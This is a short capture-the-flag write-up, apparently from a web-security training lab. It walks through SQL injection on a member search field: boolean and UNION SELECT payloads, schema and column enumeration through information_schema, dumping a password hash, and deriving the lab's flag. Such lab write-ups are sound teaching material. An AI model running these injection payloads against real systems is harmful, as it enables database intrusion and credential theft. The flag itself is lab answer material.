## 02 SQL from member search

There is `Search member by ID: ` and when we put 1, it shows us a user.

I put

```
105 OR 1=1
```

And I got all users.

```
ID: 105 OR 1=1
First name: Flag
Surname : GetThe
```

We are guessing sql will look like this.

```
SELECT first_name, last_name FROM Users WHERE ID = 105 OR 1=1
```

```
1 union select null, first_name, last_name from members
->
Table 'Member_Sql_Injection.members' doesn't exist
```

```
1 UNION SELECT * FROM users --
->
The used SELECT statements have a different number of columns
```

```
ID: 1 UNION SELECT first_name, last_name FROM users
First name: Flag
Surname : GetThe
```

```
1 UNION SELECT password, last_name FROM users
->
Unknown column 'password' in 'field list'
```

Get schema names

```
ID: 1 union select schema_name, null from information_schema.schemata
First name: Member_Sql_Injection
Surname :
```

Get column names

````
ID: 1 UNION SELECT column_name, table_name FROM information_schema.columns
First name: Commentaire
Surname : users

ID: 1 UNION SELECT column_name, table_name FROM information_schema.columns
First name: countersign
Surname : users```

````

```
ID: 1 UNION SELECT commentaire, countersign FROM users
First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
Surname : 5ff9d0165b4f92b14994e5c685cdce28

```

```

encode fortytwo with sh256
FLAG: 3b4e8a30ecbfde518f50f2bda1912b40338ecd71821faeb1e9cdf44cefff95f5

```
